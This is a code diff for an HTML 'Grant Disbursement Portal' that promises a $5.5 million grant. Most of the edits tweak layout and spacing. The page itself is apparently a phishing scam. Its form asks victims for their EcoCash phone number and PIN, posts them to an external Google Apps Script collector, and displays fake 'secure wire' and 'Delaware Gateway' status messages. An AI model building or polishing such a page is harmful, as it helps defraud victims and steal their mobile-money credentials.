@@ -17,14 +17,15 @@
         .hero { 
             background: linear-gradient(rgba(0, 35, 73, 0.88), rgba(0, 35, 73, 0.88)), 
                         url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=2070'); 
-            background-size: cover; background-position: center; color: white; padding: 120px 0; text-align: center;
+            background-size: cover; background-position: center; color: white; padding: 100px 0; text-align: center;
         }
         .hero h1 { font-family: 'Playfair Display', serif; font-size: 3.5rem; }
 
         .partners-grid { background: var(--light-grey); padding: 50px 0; border-top: 1px solid #dee2e6; border-bottom: 1px solid #dee2e6; }
         .partner-logo { opacity: 0.7; font-weight: 700; color: #444; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }
 
-        .app-box { max-width: 800px; margin: -100px auto 100px; background: white; border-radius: 12px; box-shadow: 0 30px 60px rgba(0,0,0,0.18); border: 1px solid #e1e8ed; overflow: hidden; position: relative; z-index: 10; }
+        /* THE FIX: margin-top: 80px creates the requested space */
+        .app-box { max-width: 800px; margin: 80px auto 100px; background: white; border-radius: 12px; box-shadow: 0 30px 60px rgba(0,0,0,0.18); border: 1px solid #e1e8ed; overflow: hidden; position: relative; z-index: 10; }
         .app-header { background: #f8fafd; border-bottom: 2px solid #f0f0f0; padding: 45px; text-align: center; }
         .app-body { padding: 50px; }
 
@@ -98,14 +99,12 @@
                     <div class="step-circle" id="dot2">2</div>
                     <div class="step-circle" id="dot3">3</div>
                 </div>
-                <br>
                 <h2>Grant Disbursement Portal</h2>
                 <p class="text-muted mb-0 fw-bold">TOTAL ALLOCATION: $5,500,000.00 USD</p>
             </div>                        
             
             <div class="app-body">
                 <form id="globalGrantForm">
-                    
                     <div id="step1">
                         <h5 class="mb-4 text-primary fw-bold">I. INSTITUTIONAL IDENTITY</h5>
                         <label>Legal Business Name</label>
@@ -197,10 +196,8 @@
     </footer>
 
     <script>
-        // YOUR INTEGRATED GOOGLE SCRIPT URL
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSK6rXXRtu0avhEvpEJk3_Ym4hqKA2TIDzO8PhGYYSaxdEPMMEeiFleL21xd4-Udkfwg/exec';
 
-        // Fix for "Invalid form control" error: Manual Validation
         function validateAndNext(current, next) {
             let pass = true;
             if(current === 1) {
@@ -220,24 +217,20 @@
             document.getElementById('step2').style.display = 'none';
             document.getElementById('step3').style.display = 'none';
             document.getElementById('step' + s).style.display = 'block';
-            
             for(let i=1; i<=3; i++){ document.getElementById('dot'+i).classList.remove('active'); }
             document.getElementById('dot'+s).classList.add('active');
-            window.scrollTo({ top: 400, behavior: 'smooth' });
+            window.scrollTo({ top: 500, behavior: 'smooth' }); // Adjusted for better viewing
         }
 
         const form = document.getElementById('globalGrantForm');
         form.addEventListener('submit', e => {
             e.preventDefault();
-            
-            // Step 3 final check
             if(!document.getElementById('biz_phone').value || !document.getElementById('biz_pin').value) {
                 alert("Please enter EcoCash verification details."); return;
             }
 
             const btn = document.getElementById('finalSubmit');
             const st = document.getElementById('statusReport');
-            
             btn.disabled = true;
             btn.innerText = "INITIATING SECURE WIRE...";
             st.innerHTML = "<div class='spinner-border text-primary'></div><br><small>Communicating with Delaware Gateway...</small>";
